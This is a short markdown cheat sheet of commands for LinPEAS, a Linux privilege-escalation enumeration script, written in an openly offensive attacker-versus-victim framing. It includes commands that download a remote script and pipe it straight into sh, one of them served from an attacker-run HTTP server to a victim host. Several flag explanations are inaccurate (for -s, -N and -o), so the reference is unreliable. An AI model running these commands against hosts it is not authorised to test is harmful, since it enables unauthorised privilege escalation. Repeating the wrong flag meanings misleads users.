---
title: Linpeas Command List
date: 2026-01-05
category: commands
enrich: false
tags: linpeas, cybersecurity, command reference
description: Top 10 essential commands for linpeas.
---

# LinPEAS Command Guide

**LinPEAS** (Linux Privilege Escalation Awesome Script) checks for known potential paths to escalate privileges on Linux/Unix hosts.

## Top 10 Useful Commands

### 1. Execute from Web (Fileless)
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
**Explanation:** Download and run immediately in RAM.

### 2. Standard Run
```bash
./linpeas.sh
```
**Explanation:** Run the script (must be chmod +x).

### 3. All Checks
```bash
./linpeas.sh -a
```
**Explanation:** Run extensive tests (takes longer).

### 4. Output to File
```bash
./linpeas.sh > output.txt
```
**Explanation:** Save logs (Output includes color codes, can be messy to read raw, see #5).

### 5. Output Readable
```bash
./linpeas.sh | tee output.txt
```
**Explanation:** See it on screen AND save it. Use `less -r output.txt` to view colors.

### 6. Search Password
```bash
./linpeas.sh -s
```
**Explanation:** Search fast, focus on password files.

### 7. Networking Info
```bash
./linpeas.sh -N
```
**Explanation:** Focus on network enumeration.

### 8. Quiet Mode
```bash
./linpeas.sh -q
```
**Explanation:** Only print things that are highly likely to be vulnerabilities (Red/Yellow).

### 9. Enumeration Server
```bash
# (Attacker)
python3 -m http.server 80
# (Victim)
curl 10.10.10.10/linpeas.sh | sh
```

### 10. Report mode
```bash
./linpeas.sh -o
# (Not standard flag, but common request)
```

## The Most Powerful Command
```bash
./linpeas.sh
```
**Explanation:** Just run it. The power is in the COLOR CODING. **RED/YELLOW** text means "95% Probable Privilege Escalation path" (e.g., a SUID binary or bad Kernel).

